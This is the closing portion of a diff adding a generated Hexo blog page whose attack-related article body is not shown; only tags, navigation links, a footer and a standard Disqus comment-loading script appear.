+    <div class="post-entry__tags"><a href="/blog/tags/%E8%B3%87%E8%A8%8A%E5%AE%89%E5%85%A8/" class="post-tags__link button"># 資訊安全</a><a href="/blog/tags/XSS/" class="post-tags__link button"># XSS</a><a href="/blog/tags/SQL-injection/" class="post-tags__link button"># SQL injection</a><a href="/blog/tags/CSRF/" class="post-tags__link button"># CSRF</a></div> 
+</article>
+
+
+    <div class="nav">
+        <div class="nav__prev">
+            
+                <a href="/blog/article/cache-1/" class="nav__link">
+                    <div>
+                        <svg viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg" width="24" height="24"><path d="M589.088 790.624L310.464 512l278.624-278.624 45.248 45.248L400.96 512l233.376 233.376z" fill="#808080"></path></svg>
+                    </div>
+                    <div>
+                        <div class="nav__label">
+                            上一篇
+                        </div>
+                        <div class="nav__title">
+                            快取 Cache 是什麼？那些網頁前端的快取（上）
+                        </div>
+                    </div>
+                </a>
+            
+        </div>
+        <div class="nav__next">
+            
+                <a href="/blog/article/password/" class="nav__link">
+                    <div>
+                        <div class="nav__label">
+                            下一篇
+                        </div>
+                        <div class="nav__title">
+                            密碼保護
+                        </div>
+                    </div>
+                    <div>
+                        <svg viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg" width="24" height="24"><path d="M434.944 790.624l-45.248-45.248L623.04 512l-233.376-233.376 45.248-45.248L713.568 512z" fill="#808080"></path></svg>
+                    </div>
+                </a>
+            
+        </div>
+    </div>
+
+
+
+    <div class="post__comments post__with-toc content-card" id="comment">
+        
+    <h4>評論</h4>
+    
+    <div id="disqus_thread">無法加載 Disqus 評論系統，請確保您的網絡能夠正常訪問。</div>
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+
+    </div>
+
+
+
+</main>
+
+            <footer class="footer">
+     
+    <a href="#" class="button" id="b2t" aria-label="回到頂部" title="回到頂部">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024" width="32" height="32">
+            <path d="M233.376 722.752L278.624 768 512 534.624 745.376 768l45.248-45.248L512 444.128zM192 352h640V288H192z" fill="currentColor"></path>
+        </svg>
+    </a>
+
+    
+
+
+    
+     
+ 
+
+ 
+    
+        
+        <p class="footer-copyright">
+            Copyright © 2024 <a href="/blog/">Yu&#39;s Blog</a>
+        </p>
+    
+    
+    <p>Powered by <a href="https://hexo.io" target="_blank">Hexo</a> | Theme - <a href="https://github.com/ChrAlpha/hexo-theme-cards" target="_blank">Cards</a></p>
+</footer>
+
+        </div>
+         
+
+ 
+
+ 
+
+ 
+
+ 
+
+
+
+ 
+
+
+
+ 
+
+
+    
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+ 
+
+
+    
+    <script>
+        function loadComment() {
+            window.disqus_config = function () {
+                this.page.url = 'https://yu040419.github.io/blog/article/attack/';
+                this.page.identifier = 'article/attack/';
+            };
+            (function(){
+                var dsq = document.createElement('script');
+                dsq.type = 'text/javascript';
+                dsq.async = true;
+                dsq.src = '//' + 'yu040419' + '.disqus.com/embed.js';
+                (document.head || document.body).appendChild(dsq);
+            })();
+        }
+    
+        var runningOnBrowser = typeof window !== "undefined";
+        var isBot = runningOnBrowser && !("onscroll" in window) || typeof navigator !== "undefined" && /(gle|ing|ro|msn)bot|crawl|spider|yand|duckgo/i.test(navigator.userAgent);
+        var supportsIntersectionObserver = runningOnBrowser && "IntersectionObserver" in window;
+    
+        setTimeout(function () {
+            if (!isBot && supportsIntersectionObserver) {
+                var comment_observer = new IntersectionObserver(function(entries) {
+                    if (entries[0].isIntersecting) {
+                        loadComment();
+                        comment_observer.disconnect();
+                    }
+                }, { threshold: [0] });
+                comment_observer.observe(document.getElementById('comment'));
+            } else {
+                loadComment();
+            }
+        }, 1);
+    </script>
+
+
+    
+
+    
+    
+
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+
+    
+    
+    
+
+
+
+    </body>
+</html>
